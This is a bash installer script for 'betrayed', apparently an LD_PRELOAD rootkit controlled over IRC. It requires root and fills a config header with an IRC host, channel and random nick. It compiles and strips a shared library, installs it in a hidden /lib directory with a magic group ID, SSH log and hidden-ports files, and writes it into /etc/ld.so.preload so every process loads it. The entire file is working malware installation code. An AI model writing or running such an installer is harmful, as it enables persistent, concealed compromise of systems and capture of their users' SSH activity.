#!/bin/bash

# nothing to really see here
[ $(id -u) != 0 ] && [ -z $COMPILE_ONLY ] && exit
usage(){ echo "$0 irc.host \"#channel\""; exit; }
[ -z "$1" ] && usage
[ -z "$2" ] && usage

# get meeeee config
HOST="$1"
CHANNEL="$2"
[ -z $NICK ] && NICK="$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 8 | head -n 1)"
[ -z $MGID ] && MGID=$(cat /dev/urandom | tr -dc '1-9' | fold -w 6 | head -n 1)
[ -z $INSTALL_DIR ] && INSTALL_DIR="/lib/betrayed.$NICK"
[ -z $SSH_LOGS ] && SSH_LOGS="$INSTALL_DIR/betrayed_ssh"
[ -z $HIDDEN_PORTS ] && HIDDEN_PORTS="$INSTALL_DIR/hidden_ports"

# config meeeee
sed -i "s:??HOST??:$HOST:" config.h
sed -i "s:??CHANNEL??:$CHANNEL:" config.h
sed -i "s:??NICK??:$NICK:" config.h
sed -i "s:??MGID??:$MGID:" config.h
sed -i "s:??INSTALL_DIR??:$INSTALL_DIR:" config.h
sed -i "s:??SSH_LOGS??:$SSH_LOGS:" config.h

# compile meeeeee
cf="betrayed.c"
so="betrayed.so.`uname -m`"
rm -rf *.so.*
LFLAGS="-ldl"
WFLAGS="-Wall"
FFLAGS="-fomit-frame-pointer -fPIC"
gcc -std=gnu99 $cf -O0 $WFLAGS $FFLAGS -shared $LFLAGS -Wl,--build-id=none -o $so
strip $so || { echo "couldn't strip lib, exiting"; exit; }
cp config.bak.h config.h

[ ! -z $COMPILE_ONLY ] && exit

# setup meeee
# no magic environment variable this time 'round so
# we gotta set it all up before preloading the lib.
mkdir -p $INSTALL_DIR && chown 0:$MGID $INSTALL_DIR
if [ -d $INSTALL_DIR ]; then
    mv $so $INSTALL_DIR/$so && chown 0:$MGID $INSTALL_DIR/$so
    touch $SSH_LOGS && chmod 666 $SSH_LOGS && chown 0:$MGID $SSH_LOGS
    touch $HIDDEN_PORTS && chown 0:$MGID $HIDDEN_PORTS
    touch /etc/ld.so.preload && chown 0:$MGID /etc/ld.so.preload
    echo $INSTALL_DIR/$so > /etc/ld.so.preload && echo "we pimpin"
    cat /dev/null # start a process so we can fork straight away
fi
